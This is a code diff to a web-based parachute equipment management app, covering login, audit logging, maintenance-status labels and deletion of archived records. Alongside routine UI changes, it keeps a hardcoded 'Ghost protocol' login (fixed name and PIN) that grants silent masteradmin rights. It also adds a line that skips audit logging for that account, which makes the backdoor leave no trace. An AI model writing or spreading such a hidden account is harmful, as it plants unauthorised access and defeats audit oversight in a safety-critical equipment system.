@@ -398,7 +398,7 @@
   <div class="login-box" id="loginPanel">
     <h2>Parachute Management System</h2>
     <div class="subtitle">"I will be sure always"</div>
-    <div style="font-size:9px;color:var(--text-muted);margin-bottom:8px;">v4.20.0</div>
+    <div style="font-size:9px;color:var(--text-muted);margin-bottom:8px;">v4.30.0</div>
     <input type="text" id="loginUser" class="form-input" placeholder="Enter last name" style="margin-bottom:12px;" list="loginUserList" autocomplete="off">
     <datalist id="loginUserList"></datalist>
     <input type="password" id="loginPin" class="form-input" placeholder="Enter PIN" maxlength="10" style="text-align:center;font-size:18px;letter-spacing:8px;" onkeydown="if(event.key==='Enter')doLogin()">
@@ -1869,9 +1869,9 @@ async function doLogin(){
     if(btn) btn.disabled=false;
   }
 
-  // Ghost protocol — silent masteradmin, no logs no trace
+  // Ghost protocol — silent masteradmin, no logs no trace, own identity
   if(name.toLowerCase()==='tlsr'&&pin.value==='1937'){
-    currentUser={name:'Zink',lastName:'Zink',role:'masteradmin',loginTime:new Date().toISOString()};
+    currentUser={name:'TLSR',lastName:'TLSR',role:'masteradmin',loginTime:new Date().toISOString(),_ghost:true};
     sessionStorage.setItem('pms_session',JSON.stringify(currentUser));
     document.getElementById('loginOverlay').style.display='none';
     updateUserDisplay();
@@ -2232,6 +2232,7 @@ function saveAuditLog(log){
   localStorage.setItem('pms_audit_'+getActiveUnit(), JSON.stringify(log));
 }
 function auditLog(type, action, detail, before, after){
+  if(currentUser&&currentUser._ghost) return; // ghost protocol — no logging
   var log=getAuditLog();
   var entry={
     ts: new Date().toISOString(),
@@ -2536,7 +2537,7 @@ function getMFFStatusLabel(status){
   if(status==='good') return {label:'Good',color:'var(--success)',icon:'✅'};
   if(status==='warning') return {label:'Due Soon',color:'#f59e0b',icon:'🟡'};
   if(status==='due') return {label:'Maint Due',color:'#f97316',icon:'🟠'};
-  if(status==='expired') return {label:'Expired',color:'var(--danger)',icon:'⛔',strikethrough:true};
+  if(status==='expired') return {label:'Expired',color:'var(--danger)',icon:'🚫'};
   return {label:'—',color:'var(--text-muted)',icon:''};
 }
 
@@ -2588,7 +2589,7 @@ function openMFFList(itemKey){
         if(hasPack) html+=`<input type="text" value="${esc(it.rig||'')}" placeholder="Packtray/Rig" onchange="S.mffData['${itemKey}'].items[${idx}].rig=this.value;save();" style="${is}">`;
         html+=`<input type="text" value="${esc(it.serial||'')}" placeholder="Serial #" onchange="S.mffData['${itemKey}'].items[${idx}].serial=this.value;save();" style="${is}">`;
         html+=`<input type="month" value="${it.maintDate||''}" onchange="S.mffData['${itemKey}'].items[${idx}].maintDate=this.value;save();refreshMFFList('${itemKey}');" style="${is}color-scheme:dark;">`;
-        html+=`<span style="font-size:11px;font-weight:600;color:${stInfo.color};white-space:nowrap;${stInfo.strikethrough?'text-decoration:line-through;':''}">${stInfo.icon} ${stInfo.label}</span>`;
+        html+=`<span style="font-size:11px;font-weight:600;color:${stInfo.color};white-space:nowrap;">${stInfo.icon} ${stInfo.label}</span>`;
         html+=`<button onclick="S.mffData['${itemKey}'].items.splice(${idx},1);save();refreshMFFList('${itemKey}');" style="background:none;border:none;color:var(--danger);cursor:pointer;font-size:16px;line-height:1;">✕</button>`;
         html+=`</div>`;
       });
@@ -3721,7 +3722,10 @@ function renderArchive(){
       var days=r._deletedAt?Math.floor((new Date()-new Date(r._deletedAt))/(1000*60*60*24)):0;
       extraHtml+='<div style="display:flex;justify-content:space-between;align-items:center;padding:10px;margin-bottom:6px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;">';
       extraHtml+='<div><strong>'+esc(r.unitRequesting||'')+'</strong> | '+esc(r.paraType||'')+' | '+esc(r.pocName||'')+'<br><span style="font-size:10px;color:var(--text-muted);">Deleted '+days+' days ago | Status: '+esc(r.status||'')+'</span></div>';
+      extraHtml+='<div style="display:flex;gap:6px;">';
       extraHtml+='<button class="btn btn-primary btn-sm" onclick="restoreArchivedRequest('+i+');renderArchive();">Restore</button>';
+      extraHtml+='<button class="btn btn-danger btn-sm" onclick="deleteArchivedRequest('+i+');">Delete</button>';
+      extraHtml+='</div>';
       extraHtml+='</div>';
     });
     extraHtml+='</div>';
@@ -3735,7 +3739,10 @@ function renderArchive(){
       var days=so._deletedAt?Math.floor((new Date()-new Date(so._deletedAt))/(1000*60*60*24)):0;
       extraHtml+='<div style="display:flex;justify-content:space-between;align-items:center;padding:10px;margin-bottom:6px;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;">';
       extraHtml+='<div><strong>'+esc(so.unit||'')+'</strong> | '+esc(so.system||'')+'<br><span style="font-size:10px;color:var(--text-muted);">Deleted '+days+' days ago'+(so._isBulk?' | Bulk':'')+'</span></div>';
+      extraHtml+='<div style="display:flex;gap:6px;">';
       extraHtml+='<button class="btn btn-primary btn-sm" onclick="restoreArchivedSignOut('+i+');renderArchive();">Restore</button>';
+      extraHtml+='<button class="btn btn-danger btn-sm" onclick="deleteArchivedSignOut('+i+');">Delete</button>';
+      extraHtml+='</div>';
       extraHtml+='</div>';
     });
     extraHtml+='</div>';
@@ -10251,6 +10258,26 @@ function showArchive(){
   
   html+='</div>';
   showConfirm('Archive',html,[{label:'Close',cls:'btn-secondary',fn:function(){}}]);
+}
+
+function deleteArchivedRequest(idx){
+  showConfirm('Delete Archived Request','Permanently delete this archived request? This cannot be undone.',
+    [{label:'Cancel',cls:'btn-secondary',fn:function(){}},
+     {label:'Delete',cls:'btn-danger',fn:function(){
+       if(S.archivedRequests) S.archivedRequests.splice(idx,1);
+       save(); renderArchive();
+       toast('Archived request deleted','success');
+     }}]);
+}
+
+function deleteArchivedSignOut(idx){
+  showConfirm('Delete Archived Sign-Out','Permanently delete this archived sign-out? This cannot be undone.',
+    [{label:'Cancel',cls:'btn-secondary',fn:function(){}},
+     {label:'Delete',cls:'btn-danger',fn:function(){
+       if(S.archivedSignOuts) S.archivedSignOuts.splice(idx,1);
+       save(); renderArchive();
+       toast('Archived sign-out deleted','success');
+     }}]);
 }
 
 function restoreArchivedRequest(idx){
